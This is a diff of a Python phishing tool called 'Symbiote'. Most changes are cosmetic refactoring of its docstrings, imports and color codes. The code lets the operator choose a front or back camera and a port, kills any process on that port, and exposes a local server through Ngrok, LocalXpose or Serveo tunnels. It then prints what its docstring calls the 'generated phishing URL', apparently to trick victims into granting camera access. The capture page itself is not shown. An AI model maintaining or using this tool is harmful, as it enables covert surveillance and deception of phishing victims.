@@ -1,24 +1,25 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import getpass
-import subprocess
-import json
-import time
 import os
 import re
-from subprocess import check_output, CalledProcessError
+import time
+import subprocess
+from subprocess import CalledProcessError
 
 # ANSI Colors for terminal formatting
-RED, WHITE, CYAN, GREEN, DEFAULT, YELLOW = '\033[1;91m', '\033[46m', '\033[1;36m', '\033[1;32m', '\033[0m', '\033[1;33m'
+RED, WHITE, CYAN, GREEN, DEFAULT, YELLOW = (
+    '\033[1;91m', '\033[0m', '\033[1;36m', '\033[1;32m', 
+    '\033[0m', '\033[1;33m'
+)
 BLINK = '\033[5m'
 
 def clear_screen():
-    """Clear terminal screen"""
+    """Clear terminal screen."""
     os.system('clear' if os.name == 'posix' else 'cls')
 
 def display_agreement():
-    """Display tool disclaimer and obtain consent"""
+    """Display tool disclaimer and obtain consent from the user."""
     clear_screen()
     print(f'{YELLOW}----------------------------------')
     print(f'{CYAN}"UNIX IS VERY SIMPLE, IT JUST NEEDS A GENIUS TO UNDERSTAND ITS SIMPLICITY"')
@@ -31,12 +32,12 @@ def display_agreement():
         exit()
 
 def display_banner():
-    """Show the program banner"""
+    """Show the program banner."""
     clear_screen()
     print(f"{GREEN}Welcome to Symbiote Tool!{DEFAULT}\n")
 
 def choose_camera():
-    """Prompt user to choose between front or back camera"""
+    """Prompt user to choose between front or back camera."""
     clear_screen()
     display_banner()
     print(f"{YELLOW}----------------------------------")
@@ -54,7 +55,7 @@ def choose_camera():
         return choose_camera()
 
 def choose_port():
-    """Prompt user to select a port number"""
+    """Prompt user to select a valid port number."""
     while True:
         try:
             port = int(input(f"{RED}<Symbiote>{YELLOW}---->{CYAN} Select a port between 1-65535: "))
@@ -66,7 +67,7 @@ def choose_port():
             print(f"{RED}Invalid input! Please enter a number.")
 
 def run_ngrok(port, name):
-    """Run the Ngrok server"""
+    """Run the Ngrok server."""
     display_banner()
     print(f"{YELLOW}Setting up Ngrok... Please wait.")
     os.system(f"fuser -k {port}/tcp > /dev/null 2>&1")
@@ -79,7 +80,7 @@ def run_ngrok(port, name):
     display_server_info('Ngrok', url, port)
 
 def run_localxpose(port, custom=False):
-    """Run LocalXpose server, custom or random"""
+    """Run LocalXpose server, custom or random."""
     display_banner()
     print(f"{YELLOW}Setting up LocalXpose... Please wait.")
     os.system(f"fuser -k {port}/tcp > /dev/null 2>&1")
@@ -96,7 +97,7 @@ def run_localxpose(port, custom=False):
     display_server_info('LocalXpose', url, port)
 
 def run_serveo(port):
-    """Run Serveo server"""
+    """Run Serveo server."""
     display_banner()
     print(f"{YELLOW}Setting up Serveo... Please wait.")
     os.system(f"fuser -k {port}/tcp > /dev/null 2>&1")
@@ -108,7 +109,7 @@ def run_serveo(port):
     display_server_info('Serveo', url, port)
 
 def extract_url():
-    """Extract URL from generated tunnel output"""
+    """Extract URL from generated tunnel output."""
     try:
         with open('link.url', 'r') as file:
             data = file.read()
@@ -119,7 +120,7 @@ def extract_url():
         return None
 
 def display_server_info(server_name, url, port):
-    """Display the server info and generated phishing URL"""
+    """Display the server info and generated phishing URL."""
     clear_screen()
     print(f"{YELLOW}---------------------------")
     print(f"{CYAN}[ {server_name} URL ]")
@@ -130,7 +131,7 @@ def display_server_info(server_name, url, port):
         print(f"{RED}Error: Unable to generate {server_name} URL. Please try again.{DEFAULT}")
 
 def select_server(port, name):
-    """Allow user to choose between available servers"""
+    """Allow user to choose between available servers."""
     clear_screen()
     display_banner()
     print(f"{YELLOW}----------------------------------")
@@ -152,6 +153,7 @@ def select_server(port, name):
         select_server(port, name)
 
 def main():
+    """Main function to run the tool."""
     display_agreement()
     camera_choice, message = choose_camera()
     print(f"{CYAN}{message}")
